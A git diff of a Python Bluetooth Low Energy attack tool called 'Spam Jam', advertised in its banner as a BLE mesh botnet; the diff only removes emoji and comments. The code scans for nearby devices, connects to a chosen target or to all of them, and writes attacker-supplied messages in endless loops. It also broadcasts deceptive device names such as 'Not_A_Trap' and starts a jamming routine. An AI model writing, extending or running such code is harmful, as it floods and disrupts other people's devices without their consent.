@@ -6,7 +6,6 @@ import random
 import subprocess
 from bluepy.btle import Scanner, Peripheral, DefaultDelegate, ADDR_TYPE_RANDOM, ADDR_TYPE_PUBLIC, BTLEException
 
-# 🎨 Spam Jam Banner
 def print_banner():
     print(r"""
 ███████╗██████╗  █████╗ ███╗   ███╗         ██╗ █████╗ ███╗   ███╗
@@ -15,23 +14,21 @@ def print_banner():
 ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ██   ██║██╔══██║██║╚██╔╝██║
 ███████║██║     ██║  ██║██║ ╚═╝ ██║    ╚█████╔╝██║  ██║██║ ╚═╝ ██║
 ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ 
-💜 Spam Jam – Now with BLE Mesh Network Botnet by ekoms savior 💜
+ Spam Jam – Now with BLE Mesh Network Botnet by ekoms savior 
 """)
 
-# 🎯 BLE Spam Class
 class BLESpam(DefaultDelegate):
     def __init__(self):
         DefaultDelegate.__init__(self)
     def handleNotification(self, cHandle, data):
-        print(f"🔔 Notification from BLE device: {data}")
+        print(f" Notification from BLE device: {data}")
 
-# 💌 BLE Advertise All
 def flipper_ble_advertise_all():
-    print("💜 Launching BLE Advertise All  💣📡")
+    print(" Launching BLE Advertise All  ")
     names = [
-        "SpamJam_XOXO", "💜HAXX💜", "BLE_Boop", "👾x0x0x", 
-        "Free_Wifi_LOL", "Not_A_Trap", "💣 BT_Bomb", "UFO-SIGNAL", 
-        "🍭CandyBLE", "💀NSA_Van", "HackThePlanet", "💜ekomsSavior💜"
+        "SpamJam_XOXO", "HAXX", "BLE_Boop", "x0x0x", 
+        "Free_Wifi_LOL", "Not_A_Trap", " BT_Bomb", "UFO-SIGNAL", 
+        "CandyBLE", "NSA_Van", "HackThePlanet", "ekomsSavior"
     ]
     try:
         subprocess.run(["bluetoothctl", "power", "on"], stdout=subprocess.DEVNULL)
@@ -46,37 +43,35 @@ def flipper_ble_advertise_all():
                 time.sleep(1.2)
 
     except KeyboardInterrupt:
-        print("\n🛑 BLE Advertise All stopped. Restoring name...")
+        print("\n BLE Advertise All stopped. Restoring name...")
         subprocess.run(["bluetoothctl", "system-alias", "SpamJam"], stdout=subprocess.DEVNULL)
 
-# 🔎 BLE Scanner
 def interactive_ble_scan():
-    print("🔎 Scanning for BLE devices nearby...")
+    print(" Scanning for BLE devices nearby...")
     scanner = Scanner()
     try:
         devices = list(scanner.scan(10.0))
         if not devices:
-            print("⚠️ No BLE devices found.")
+            print(" No BLE devices found.")
             return []
         for idx, dev in enumerate(devices):
             print(f"🔹 {idx}: {dev.addr} ({dev.addrType}), RSSI={dev.rssi} dB")
         return devices
     except BTLEException as e:
-        print(f"⚠️ Scan failed: {e}")
+        print(f" Scan failed: {e}")
         return []
 
-# 💌 Spam Single BLE Device
 def spam_ble():
     devices = interactive_ble_scan()
     if not devices:
         return
     try:
-        idx = int(input("💜 Index to spam: "))
+        idx = int(input(" Index to spam: "))
         target_mac = devices[idx].addr
     except (ValueError, IndexError):
-        print("⚠️ Invalid index.")
+        print(" Invalid index.")
         return
-    custom_message = input("💜 Your spam message: ").encode()
+    custom_message = input(" Your spam message: ").encode()
     try:
         peripheral = Peripheral(target_mac, ADDR_TYPE_RANDOM)
     except BTLEException:
@@ -89,30 +84,28 @@ def spam_ble():
     while True:
         try:
             peripheral.writeCharacteristic(0x0001, custom_message)
-            print(f"💜 Spammed: {custom_message.decode(errors='ignore')}")
+            print(f" Spammed: {custom_message.decode(errors='ignore')}")
             time.sleep(0.5)
         except Exception as e:
-            print(f"⚠️ Error: {e}")
+            print(f" Error: {e}")
             break
 
-# 💌 Spam All BLE Devices
 def spam_all_ble():
     devices = interactive_ble_scan()
     if not devices:
         return
-    custom_message = input("💜 Message for all: ").encode()
+    custom_message = input(" Message for all: ").encode()
     for device in devices:
         try:
-            print(f"🚀 Spamming {device.addr}")
+            print(f" Spamming {device.addr}")
             peripheral = Peripheral(device.addr, ADDR_TYPE_RANDOM)
             peripheral.setDelegate(BLESpam())
             peripheral.writeCharacteristic(0x0001, custom_message)
-            print(f"💜 Sent to {device.addr}")
+            print(f" Sent to {device.addr}")
             peripheral.disconnect()
         except Exception as e:
-            print(f"⚠️ {device.addr} skipped: {e}")
+            print(f" {device.addr} skipped: {e}")
 
-# 🚫 Jam Single
 def jam_ble():
     subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL)
     scanner = Scanner()
